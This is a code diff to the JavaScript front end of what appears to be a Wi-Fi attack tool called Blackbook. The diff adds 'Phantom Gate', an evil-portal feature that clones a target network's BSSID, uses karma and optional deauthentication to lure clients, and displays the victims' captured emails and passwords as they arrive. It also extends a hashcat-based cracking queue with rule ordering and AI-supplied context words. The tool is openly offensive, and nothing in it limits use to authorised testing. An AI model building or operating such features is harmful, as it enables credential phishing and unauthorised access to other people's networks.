@@ -199,6 +199,7 @@ function cacheDOM() {
         hashesContainer: $('hashes-container'),
         hashCount: $('hash-count'),
         hashSort: $('hash-sort'),
+        btnDeduplicate: $('btn-deduplicate'),
         logContainer: $('log-container'),
 
         filterEssid: $('filter-essid'),
@@ -246,6 +247,41 @@ function cacheDOM() {
         autosolveCancel: $('autosolve-cancel'),
         autosolveQueue: $('autosolve-queue'),
         btnAutosolveStart: $('btn-autosolve-start'),
+
+        // Phantom Gate (Evil Portal)
+        portalModal: $('portal-modal'),
+        portalClose: $('portal-close'),
+        portalCancel: $('portal-cancel'),
+        portalTargetEssid: $('portal-target-essid'),
+        portalTargetBssid: $('portal-target-bssid'),
+        portalTargetChannel: $('portal-target-channel'),
+        portalInAdapter: $('portal-in-adapter'),
+        portalOutAdapter: $('portal-out-adapter'),
+        portalMode: $('portal-mode'),
+        portalPasswordGroup: $('portal-password-group'),
+        portalPassword: $('portal-password'),
+        portalCloneBssid: $('portal-clone-bssid'),
+        portalStrategy: $('portal-strategy'),
+        portalDeauth: $('portal-deauth'),
+        portalLiveStatus: $('portal-live-status'),
+        portalStatusText: $('portal-status-text'),
+        portalCredsList: $('portal-creds-list'),
+        btnPortalLaunch: $('btn-portal-launch'),
+        portalLaunchText: $('portal-launch-text'),
+
+        // Portal Status Banner
+        portalBanner: $('portal-banner'),
+        portalBannerSsid: $('portal-banner-ssid'),
+        portalBannerMac: $('portal-banner-mac'),
+        portalBannerChannel: $('portal-banner-channel'),
+        portalBannerCaptured: $('portal-banner-captured'),
+        btnPortalStop: $('btn-portal-stop'),
+
+        // Portal Settings
+        settingPortalIn: $('setting-portal-in'),
+        settingPortalOut: $('setting-portal-out'),
+        settingPortalCapture: $('setting-portal-capture'),
+        settingPortalForced: $('setting-portal-forced'),
     };
 }
 
@@ -472,6 +508,11 @@ const Render = {
                         </div>
                         <div class="network-actions">
                             <div class="network-signal ${Utils.signalClass(net.power)}">${net.power} dBm</div>
+                            <button class="network-portal-btn" data-bssid="${net.bssid}" 
+                                    data-essid="${Utils.escape(net.essid || '')}" 
+                                    data-channel="${net.channel}"
+                                    data-password="${isCracked && net.cracked_password ? Utils.escape(net.cracked_password) : ''}"
+                                    title="Phantom Gate">👻</button>
                             ${!isCracked ? `
                                 <button class="network-interrogate-btn" data-bssid="${net.bssid}" title="Interrogate">
                                     !
@@ -507,8 +548,8 @@ const Render = {
         // Click handlers for network items - ONLY toggle selection, don't attack
         container.querySelectorAll('.network-item').forEach(item => {
             item.addEventListener('click', (e) => {
-                // Don't trigger if clicking checkbox, label, or interrogate button
-                if (e.target.closest('.cracked-toggle') || e.target.closest('.network-interrogate-btn')) return;
+                // Don't trigger if clicking checkbox, label, interrogate or portal button
+                if (e.target.closest('.cracked-toggle') || e.target.closest('.network-interrogate-btn') || e.target.closest('.network-portal-btn')) return;
                 const bssid = item.dataset.bssid;
                 Handlers.networkClick(bssid);
             });
@@ -519,6 +560,19 @@ const Render = {
             btn.addEventListener('click', (e) => {
                 e.stopPropagation();
                 Handlers.interrogateNetwork(btn.dataset.bssid);
+            });
+        });
+
+        // Phantom Gate portal button handlers
+        container.querySelectorAll('.network-portal-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                Handlers.openPortalModal(
+                    btn.dataset.bssid,
+                    btn.dataset.essid,
+                    btn.dataset.channel,
+                    btn.dataset.password
+                );
             });
         });
 
@@ -834,14 +888,8 @@ const Data = {
             const hashes = data.hashes || [];
             const wordlists = data.wordlists || [];
 
-            // Load available hashcat rules
-            try {
-                const rulesData = await API.get('wordlist/rules');
-                State.rules = rulesData.rules || [];
-            } catch (e) {
-                console.error('Failed to load rules:', e);
-                State.rules = [];
-            }
+            // Get rules from the same endpoint
+            State.rules = data.rules || [];
 
             // Set default wordlist preferences
             if (wordlists.length > 0) {
@@ -988,8 +1036,9 @@ const Handlers = {
     async openAutoSolveConfig() {
         // Get all wordlists including virtual (mask attacks)
         const wordlists = getAllWordlists();
+        const rules = State.rules || [];
 
-        // Build the queue UI - all wordlists are always available
+        // Build the wordlist queue UI
         const queue = DOM.autosolveQueue;
         if (!queue) return;
 
@@ -997,76 +1046,149 @@ const Handlers = {
 
         wordlists.forEach((wl, idx) => {
             const name = wl.name || wl.path?.split('/').pop() || 'Unknown';
-
-            const item = document.createElement('div');
-            item.className = 'wordlist-queue-item';
-            item.draggable = true;
-            item.dataset.name = name;
-            item.dataset.path = wl.path || '';
-
-            item.innerHTML = `
-                <span class="wordlist-queue-drag">≡</span>
-                <span class="wordlist-queue-num">${idx + 1}</span>
-                <span class="wordlist-name">${name}</span>
-                <span class="wordlist-size">${wl.word_count ? (wl.word_count / 1000).toFixed(0) + 'k' : ''}</span>
-                <span class="wordlist-status pending">Pending</span>
-            `;
-
-            // Drag events for reordering
-            item.addEventListener('dragstart', (e) => {
-                item.classList.add('dragging');
-                e.dataTransfer.setData('text/plain', name);
-            });
-            item.addEventListener('dragend', () => {
-                item.classList.remove('dragging');
-                this.updateQueueNumbers();
-            });
-            item.addEventListener('dragover', (e) => {
-                e.preventDefault();
-                const dragging = queue.querySelector('.dragging');
-                if (dragging && dragging !== item) {
-                    const rect = item.getBoundingClientRect();
-                    const midY = rect.top + rect.height / 2;
-                    if (e.clientY < midY) {
-                        queue.insertBefore(dragging, item);
-                    } else {
-                        queue.insertBefore(dragging, item.nextSibling);
-                    }
-                }
-            });
-
+            const item = this._createQueueItem(name, wl.path, idx, wl.word_count, queue);
             queue.appendChild(item);
         });
+
+        // Build the rule queue UI
+        const ruleQueue = $('autosolve-rule-queue');
+        if (ruleQueue) {
+            ruleQueue.innerHTML = '';
+
+            // Add "(no rule)" option first
+            const noRule = this._createQueueItem('(no rule)', '', 0, null, ruleQueue);
+            ruleQueue.appendChild(noRule);
+
+            // Add brazilian_wifi.rule at top if it exists
+            const brazilianRule = rules.find(r => r.name?.includes('brazilian_wifi'));
+            if (brazilianRule) {
+                const item = this._createQueueItem(brazilianRule.name, brazilianRule.path, 1, null, ruleQueue);
+                ruleQueue.appendChild(item);
+            }
+
+            // Add other rules
+            rules.forEach((r, idx) => {
+                if (r.name?.includes('brazilian_wifi')) return; // Already added
+                const item = this._createQueueItem(r.name, r.path, idx + 2, null, ruleQueue);
+                ruleQueue.appendChild(item);
+            });
+        }
+
+        // Reset context status
+        State.globalContextWords = '';
+        const contextStatus = $('autosolve-context-status');
+        if (contextStatus) contextStatus.textContent = '';
 
         DOM.autosolveModal?.classList.add('show');
     },
 
-    updateQueueNumbers() {
-        const items = DOM.autosolveQueue?.querySelectorAll('.wordlist-queue-item');
+    _createQueueItem(name, path, idx, wordCount, container) {
+        const item = document.createElement('div');
+        item.className = 'wordlist-queue-item';
+        item.draggable = true;
+        item.dataset.name = name;
+        item.dataset.path = path || '';
+
+        const sizeText = wordCount ? (wordCount / 1000).toFixed(0) + 'k' : '';
+        item.innerHTML = `
+            <span class="wordlist-queue-drag">≡</span>
+            <span class="wordlist-queue-num">${idx + 1}</span>
+            <span class="wordlist-name">${name}</span>
+            <span class="wordlist-size">${sizeText}</span>
+        `;
+
+        // Drag events for reordering
+        item.addEventListener('dragstart', (e) => {
+            item.classList.add('dragging');
+            e.dataTransfer.setData('text/plain', name);
+        });
+        item.addEventListener('dragend', () => {
+            item.classList.remove('dragging');
+            this._updateQueueNumbers(container);
+        });
+        item.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            const dragging = container.querySelector('.dragging');
+            if (dragging && dragging !== item) {
+                const rect = item.getBoundingClientRect();
+                const midY = rect.top + rect.height / 2;
+                if (e.clientY < midY) {
+                    container.insertBefore(dragging, item);
+                } else {
+                    container.insertBefore(dragging, item.nextSibling);
+                }
+            }
+        });
+
+        return item;
+    },
+
+    _updateQueueNumbers(container) {
+        const items = container?.querySelectorAll('.wordlist-queue-item');
         items?.forEach((item, idx) => {
             const num = item.querySelector('.wordlist-queue-num');
             if (num) num.textContent = idx + 1;
         });
     },
 
+    updateQueueNumbers() {
+        this._updateQueueNumbers(DOM.autosolveQueue);
+        this._updateQueueNumbers($('autosolve-rule-queue'));
+    },
+
     closeAutoSolveConfig() {
         DOM.autosolveModal?.classList.remove('show');
     },
 
+    openAIContextModal() {
+        const modal = $('ai-context-modal');
+        modal?.classList.add('show');
+    },
+
+    closeAIContextModal() {
+        const modal = $('ai-context-modal');
+        modal?.classList.remove('show');
+    },
+
+    saveAIContext() {
+        const response = $('ai-response-text')?.value || '';
+        State.globalContextWords = response.trim();
+
+        const contextStatus = $('autosolve-context-status');
+        if (contextStatus) {
+            const count = response.split(',').filter(w => w.trim()).length;
+            contextStatus.textContent = count > 0 ? `${count} words` : '';
+        }
+
+        this.closeAIContextModal();
+        Log.add(`Saved ${State.globalContextWords.split(',').length} AI context words`, 'info');
+    },
+
+    copyAIPrompt() {
+        const prompt = $('ai-prompt-text')?.value || '';
+        navigator.clipboard.writeText(prompt).then(() => {
+            Log.add('Prompt copied to clipboard', 'info');
+        });
+    },
+
     async startAutoSolveWithOrder() {
         // Get ordered wordlist names from the queue
-        const items = DOM.autosolveQueue?.querySelectorAll('.wordlist-queue-item:not(.completed)');
-        const orderedWordlists = Array.from(items || []).map(item => ({
-            name: item.dataset.name,
-            path: item.dataset.path,
-        }));
+        const wlItems = DOM.autosolveQueue?.querySelectorAll('.wordlist-queue-item');
+        const orderedWordlists = Array.from(wlItems || []).map(item => item.dataset.name);
+
+        // Get ordered rule names from the queue
+        const ruleQueue = $('autosolve-rule-queue');
+        const ruleItems = ruleQueue?.querySelectorAll('.wordlist-queue-item');
+        const orderedRules = Array.from(ruleItems || []).map(item => item.dataset.name);
 
         this.closeAutoSolveConfig();
 
         // Start with the ordered list
         const res = await API.post('rolling', {
             action: 'start',
-            wordlist_order: orderedWordlists.map(w => w.name),
+            wordlist_order: orderedWordlists,
+            rule_order: orderedRules,
+            context_words: State.globalContextWords || '',
         });
 
         if (res.success) {
@@ -1132,7 +1254,7 @@ const Handlers = {
 
     async toggleManualCracked(bssid, checked) {
         try {
-            const res = await API.post(`network / ${bssid}/cracked`, { cracked: checked });
+            const res = await API.post(`network/${bssid}/cracked`, { cracked: checked });
             if (res.success) {
                 Log.add(`${bssid} ${checked ? 'marked as solved' : 'reopened'}`, 'info');
                 // Update local state
@@ -1221,6 +1343,23 @@ const Handlers = {
             Log.add(res.message || 'Batch complete', 'success');
         } else {
             Log.add(res.error || 'Batch failed', 'error');
+        }
+    },
+
+    async deduplicateHashes() {
+        if (!confirm('This will merge multiple files for the same network and remove duplicate hash lines. Continue?')) return;
+
+        Log.add('Deduplicating evidence locker...', 'info');
+        try {
+            const res = await API.post('deduplicate_hashes');
+            if (res.success) {
+                Log.add(res.message, 'success');
+                await Data.loadHashes();
+            } else {
+                Log.add(res.error || 'Deduplication failed', 'error');
+            }
+        } catch (e) {
+            Log.add(`Error: ${e}`, 'error');
         }
     },
 
@@ -1466,9 +1605,52 @@ const Handlers = {
             if (DOM.settingInterface && settings.interface) {
                 DOM.settingInterface.value = settings.interface;
             }
-        } catch (e) { }
+
+            // Load portal settings
+            if (DOM.settingPortalCapture) {
+                DOM.settingPortalCapture.checked = settings.portal_capture_traffic !== false;
+            }
+            if (DOM.settingPortalForced) {
+                DOM.settingPortalForced.checked = settings.portal_forced_mode === true;
+            }
+
+            // Load adapter options for portal
+            await this.loadPortalAdapters(settings);
+        } catch (e) { console.error('Settings load error:', e); }
 
         DOM.settingsModal?.classList.add('show');
+    },
+
+    async loadPortalAdapters(settings) {
+        try {
+            const adapters = await API.get('adapters');
+
+            // Populate internet source dropdown
+            if (DOM.settingPortalIn) {
+                DOM.settingPortalIn.innerHTML = '<option value="">Select adapter...</option>';
+                (adapters.internet || []).forEach(a => {
+                    const opt = document.createElement('option');
+                    opt.value = a.name;
+                    opt.textContent = `${a.name} (${a.type}${a.has_internet ? ' ✓' : ''})`;
+                    if (settings?.portal_in_adapter === a.name) opt.selected = true;
+                    DOM.settingPortalIn.appendChild(opt);
+                });
+            }
+
+            // Populate evil twin adapter dropdown
+            if (DOM.settingPortalOut) {
+                DOM.settingPortalOut.innerHTML = '<option value="">Select adapter...</option>';
+                (adapters.wireless || []).forEach(a => {
+                    const opt = document.createElement('option');
+                    opt.value = a.name;
+                    opt.textContent = `${a.name} (wireless${a.supports_ap ? ' AP✓' : ''})`;
+                    if (settings?.portal_out_adapter === a.name) opt.selected = true;
+                    DOM.settingPortalOut.appendChild(opt);
+                });
+            }
+        } catch (e) {
+            console.error('Failed to load adapters:', e);
+        }
     },
 
     closeSettings() {
@@ -1479,6 +1661,11 @@ const Handlers = {
         const settings = {
             band: DOM.settingBand?.value,
             interface: DOM.settingInterface?.value,
+            // Portal settings
+            portal_in_adapter: DOM.settingPortalIn?.value || null,
+            portal_out_adapter: DOM.settingPortalOut?.value || null,
+            portal_capture_traffic: DOM.settingPortalCapture?.checked ?? true,
+            portal_forced_mode: DOM.settingPortalForced?.checked ?? false,
         };
 
         const res = await API.post('settings', settings);
@@ -1497,6 +1684,261 @@ const Handlers = {
         if (res.success) {
             const names = { 8: 'Gentle', 16: 'Firm', 32: 'Heavy', 64: 'Brutal' };
             Log.add(`Pressure set to ${names[level] || level} (${level} packets)`, 'info');
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────
+    // Phantom Gate (Evil Portal)
+    // ─────────────────────────────────────────────────────────
+
+    portalTarget: null,  // Current portal target {bssid, essid, channel, password}
+    portalPolling: null, // Status polling interval
+
+    async openPortalModal(bssid, essid, channel, password) {
+        this.portalTarget = { bssid, essid, channel, password };
+
+        if (DOM.portalTargetEssid) DOM.portalTargetEssid.textContent = essid || 'Unknown';
+        if (DOM.portalTargetBssid) DOM.portalTargetBssid.textContent = bssid;
+        if (DOM.portalTargetChannel) DOM.portalTargetChannel.textContent = channel;
+
+        // Load adapters from API
+        try {
+            const adapters = await API.get('adapters');
+            const settings = await API.get('settings');
+
+            // Populate internet source dropdown
+            if (DOM.portalInAdapter) {
+                DOM.portalInAdapter.innerHTML = '<option value="">-- Select adapter --</option>';
+                (adapters.internet || []).forEach(a => {
+                    const opt = document.createElement('option');
+                    opt.value = a.name;
+                    opt.textContent = `${a.name} (${a.type}${a.has_internet ? ' ✓' : ''})`;
+                    if (settings?.portal_in_adapter === a.name) opt.selected = true;
+                    DOM.portalInAdapter.appendChild(opt);
+                });
+            }
+
+            // Populate evil twin dropdown
+            if (DOM.portalOutAdapter) {
+                DOM.portalOutAdapter.innerHTML = '<option value="">-- Select adapter --</option>';
+                (adapters.wireless || []).forEach(a => {
+                    const opt = document.createElement('option');
+                    opt.value = a.name;
+                    opt.textContent = `${a.name} (wireless${a.supports_ap ? ' AP✓' : ''})`;
+                    if (settings?.portal_out_adapter === a.name) opt.selected = true;
+                    DOM.portalOutAdapter.appendChild(opt);
+                });
+            }
+
+            // Set Strategy default from settings
+            if (DOM.portalStrategy) {
+                // Map old boolean setting to new strategy if needed
+                let stratum = settings?.portal_strategy || 'karma';
+                if (!settings?.portal_strategy && settings?.portal_forced_mode !== undefined) {
+                    stratum = settings.portal_forced_mode ? 'karma' : 'passive';
+                }
+                DOM.portalStrategy.value = stratum;
+            }
+
+            // Warn if no adapters found
+            if ((adapters.internet || []).length === 0) {
+                Log.add('No internet adapters detected', 'warning');
+            }
+            if ((adapters.wireless || []).length === 0) {
+                Log.add('No wireless adapters detected - plug in your adapter', 'warning');
+            }
+        } catch (e) {
+            console.error('Failed to load adapters:', e);
+            Log.add('Failed to load adapters', 'error');
+        }
+
+        // Check if portal is already running
+        try {
+            const status = await API.get('portal/status');
+            if (status.active) {
+                // Portal is running - show live status
+                if (DOM.portalLiveStatus) DOM.portalLiveStatus.style.display = 'block';
+                if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Close Gate';
+                if (DOM.btnPortalLaunch) DOM.btnPortalLaunch.disabled = false;
+                this.startPortalPolling();
+            } else {
+                // Portal not running - show config
+                if (DOM.portalLiveStatus) DOM.portalLiveStatus.style.display = 'none';
+                if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Open Gate';
+                if (DOM.btnPortalLaunch) DOM.btnPortalLaunch.disabled = false;
+            }
+        } catch (e) {
+            // Assume not running on error
+            if (DOM.portalLiveStatus) DOM.portalLiveStatus.style.display = 'none';
+            if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Open Gate';
+        }
+
+        // If password is known, default to WPA2 mode
+        if (password && DOM.portalMode) {
+            DOM.portalMode.value = 'wpa2';
+            if (DOM.portalPasswordGroup) DOM.portalPasswordGroup.style.display = 'block';
+            if (DOM.portalPassword) DOM.portalPassword.value = password;
+        } else {
+            if (DOM.portalMode) DOM.portalMode.value = 'open';
+            if (DOM.portalPasswordGroup) DOM.portalPasswordGroup.style.display = 'none';
+            if (DOM.portalPassword) DOM.portalPassword.value = '';
+        }
+
+        if (DOM.portalCredsList) DOM.portalCredsList.innerHTML = '';
+
+        DOM.portalModal?.classList.add('show');
+    },
+
+    closePortalModal() {
+        // Just close the modal - don't stop the portal
+        // Portal continues running in background
+        DOM.portalModal?.classList.remove('show');
+        // Keep polling if portal is active (for status bar indicator later)
+    },
+
+    async launchPortal() {
+        if (!this.portalTarget) return;
+
+        // Get adapter values from modal dropdowns
+        const inAdapter = DOM.portalInAdapter?.value || '';
+        const outAdapter = DOM.portalOutAdapter?.value || '';
+
+        // Validate adapters are selected
+        if (!inAdapter) {
+            Log.add('Select an internet source adapter', 'warning');
+            return;
+        }
+        if (!outAdapter) {
+            Log.add('Select an evil twin adapter', 'warning');
+            return;
+        }
+        if (inAdapter === outAdapter) {
+            Log.add('Internet and Evil Twin adapters must be different', 'warning');
+            return;
+        }
+
+        const mode = DOM.portalMode?.value || 'open';
+        const password = DOM.portalPassword?.value || '';
+        const cloneBssid = DOM.portalCloneBssid?.checked ?? true;
+        const strategy = DOM.portalStrategy?.value || 'karma';
+        const enableDeauth = DOM.portalDeauth?.checked ?? false;
+
+        if (mode === 'wpa2' && !password) {
+            Log.add('Password required for WPA2 mode', 'warning');
+            return;
+        }
+
+        if (DOM.btnPortalLaunch) DOM.btnPortalLaunch.disabled = true;
+        if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Starting...';
+
+        const res = await API.post('portal/start', {
+            bssid: this.portalTarget.bssid,
+            essid: this.portalTarget.essid,
+            channel: this.portalTarget.channel,
+            in_adapter: inAdapter,
+            out_adapter: outAdapter,
+            mode,
+            password: mode === 'wpa2' ? password : null,
+            clone_bssid: cloneBssid,
+            strategy: strategy,
+            deauth: enableDeauth,
+        });
+
+        if (res.success) {
+            Log.add(`Phantom Gate opened for ${this.portalTarget.essid}`, 'success');
+            if (DOM.portalLiveStatus) DOM.portalLiveStatus.style.display = 'block';
+            if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Close Gate';
+            if (DOM.btnPortalLaunch) DOM.btnPortalLaunch.disabled = false;
+
+            // Start polling for captured credentials
+            this.startPortalPolling();
+        } else {
+            Log.add(res.error || 'Failed to open portal', 'error');
+            if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Open Gate';
+            if (DOM.btnPortalLaunch) DOM.btnPortalLaunch.disabled = false;
+        }
+    },
+
+    async stopPortal() {
+        if (DOM.btnPortalLaunch) DOM.btnPortalLaunch.disabled = true;
+        if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Closing...';
+        if (DOM.btnPortalStop) DOM.btnPortalStop.disabled = true;
+
+        const res = await API.post('portal/stop');
+
+        if (res.success) {
+            Log.add('Phantom Gate closed', 'info');
+            if (this.portalPolling) {
+                clearInterval(this.portalPolling);
+                this.portalPolling = null;
+            }
+            // Hide banner
+            if (DOM.portalBanner) DOM.portalBanner.style.display = 'none';
+            if (DOM.portalLiveStatus) DOM.portalLiveStatus.style.display = 'none';
+            if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Open Gate';
+            if (DOM.btnPortalLaunch) DOM.btnPortalLaunch.disabled = false;
+            if (DOM.btnPortalStop) DOM.btnPortalStop.disabled = false;
+        } else {
+            Log.add(res.error || 'Failed to close portal', 'error');
+            if (DOM.btnPortalLaunch) DOM.btnPortalLaunch.disabled = false;
+            if (DOM.btnPortalStop) DOM.btnPortalStop.disabled = false;
+        }
+    },
+
+    startPortalPolling() {
+        if (this.portalPolling) clearInterval(this.portalPolling);
+
+        // Immediately show banner with known target info
+        if (DOM.portalBanner && this.portalTarget) {
+            DOM.portalBanner.style.display = 'flex';
+            if (DOM.portalBannerSsid) DOM.portalBannerSsid.textContent = this.portalTarget.essid || '--';
+            if (DOM.portalBannerChannel) DOM.portalBannerChannel.textContent = this.portalTarget.channel || '--';
+        }
+
+        this.portalPolling = setInterval(async () => {
+            try {
+                const status = await API.get('portal/status');
+
+                if (!status.active) {
+                    clearInterval(this.portalPolling);
+                    this.portalPolling = null;
+                    if (DOM.portalBanner) DOM.portalBanner.style.display = 'none';
+                    if (DOM.portalLiveStatus) DOM.portalLiveStatus.style.display = 'none';
+                    if (DOM.portalLaunchText) DOM.portalLaunchText.textContent = 'Open Gate';
+                    return;
+                }
+
+                // Update banner with live status
+                if (DOM.portalBanner) DOM.portalBanner.style.display = 'flex';
+                if (DOM.portalBannerSsid) DOM.portalBannerSsid.textContent = status.target_essid || '--';
+                if (DOM.portalBannerMac) DOM.portalBannerMac.textContent = status.spoofed_mac || status.target_bssid || '--';
+                if (DOM.portalBannerChannel) DOM.portalBannerChannel.textContent = status.target_channel || '--';
+                if (DOM.portalBannerCaptured) DOM.portalBannerCaptured.textContent = status.credentials_captured || 0;
+
+                // Update captured credentials in modal
+                if (DOM.portalCredsList && status.credentials) {
+                    DOM.portalCredsList.innerHTML = status.credentials.map(c => `
+                        <div class="cred-item">
+                            <span class="cred-email">${Utils.escape(c.email || '?')}</span>
+                            <span class="cred-pass">${Utils.escape(c.password || '?')}</span>
+                            <span class="cred-time">${Utils.formatTime(c.timestamp)}</span>
+                        </div>
+                    `).join('') || '<div class="cred-empty">Waiting for victims...</div>';
+                }
+
+                if (DOM.portalStatusText) {
+                    DOM.portalStatusText.textContent = `Portal active - ${status.credentials_captured || 0} captured`;
+                }
+            } catch (e) {
+                console.error('Portal status poll error:', e);
+            }
+        }, 2000);
+    },
+
+    handlePortalModeChange() {
+        const mode = DOM.portalMode?.value || 'open';
+        if (DOM.portalPasswordGroup) {
+            DOM.portalPasswordGroup.style.display = mode === 'wpa2' ? 'block' : 'none';
         }
     },
 
@@ -1705,6 +2147,8 @@ document.addEventListener('DOMContentLoaded', () => {
         Data.loadHashes();
     });
 
+    DOM.btnDeduplicate?.addEventListener('click', () => Handlers.deduplicateHashes());
+
     // Log controls
     DOM.logAutoscroll?.addEventListener('change', (e) => {
         State.autoScroll = e.target.checked;
@@ -1746,6 +2190,38 @@ document.addEventListener('DOMContentLoaded', () => {
         Handlers.closeAutoSolveConfig();
     });
 
+    // AI Context button in autosolve modal
+    $('btn-autosolve-ai')?.addEventListener('click', () => Handlers.openAIContextModal());
+
+    // AI Context modal
+    $('ai-context-close')?.addEventListener('click', () => Handlers.closeAIContextModal());
+    $('ai-context-cancel')?.addEventListener('click', () => Handlers.closeAIContextModal());
+    $('btn-ai-context-save')?.addEventListener('click', () => Handlers.saveAIContext());
+    $('btn-copy-prompt')?.addEventListener('click', () => Handlers.copyAIPrompt());
+    $('ai-context-modal')?.querySelector('.modal-backdrop')?.addEventListener('click', () => {
+        Handlers.closeAIContextModal();
+    });
+
+    // Phantom Gate (Evil Portal) modal
+    DOM.portalClose?.addEventListener('click', () => Handlers.closePortalModal());
+    DOM.portalCancel?.addEventListener('click', () => Handlers.closePortalModal());
+    DOM.btnPortalLaunch?.addEventListener('click', () => {
+        // Toggle between launch and stop based on button text
+        const text = DOM.portalLaunchText?.textContent || '';
+        if (text.includes('Close')) {
+            Handlers.stopPortal();
+        } else {
+            Handlers.launchPortal();
+        }
+    });
+    DOM.portalMode?.addEventListener('change', () => Handlers.handlePortalModeChange());
+    DOM.portalModal?.querySelector('.modal-backdrop')?.addEventListener('click', () => {
+        Handlers.closePortalModal();
+    });
+
+    // Portal banner stop button
+    DOM.btnPortalStop?.addEventListener('click', () => Handlers.stopPortal());
+
     // ─────────────────────────────────────────────────────────
     // Start
     // ─────────────────────────────────────────────────────────
@@ -1755,6 +2231,25 @@ document.addEventListener('DOMContentLoaded', () => {
     Data.loadInterfaces();
     Data.loadNetworks();
     Data.loadHashes();
+
+    // Check if portal is already running (e.g., page refresh)
+    (async () => {
+        try {
+            const status = await API.get('portal/status');
+            if (status.active) {
+                // Restore banner
+                if (DOM.portalBanner) DOM.portalBanner.style.display = 'flex';
+                if (DOM.portalBannerSsid) DOM.portalBannerSsid.textContent = status.target_essid || '--';
+                if (DOM.portalBannerMac) DOM.portalBannerMac.textContent = status.spoofed_mac || status.target_bssid || '--';
+                if (DOM.portalBannerChannel) DOM.portalBannerChannel.textContent = status.target_channel || '--';
+                if (DOM.portalBannerCaptured) DOM.portalBannerCaptured.textContent = status.credentials_captured || 0;
+                Handlers.startPortalPolling();
+                Log.add(`Phantom Gate active for ${status.target_essid}`, 'info');
+            }
+        } catch (e) {
+            // Portal API not responding, ignore
+        }
+    })();
 
     Log.add('Blackbook ready. What do you remember?', 'success');
 });
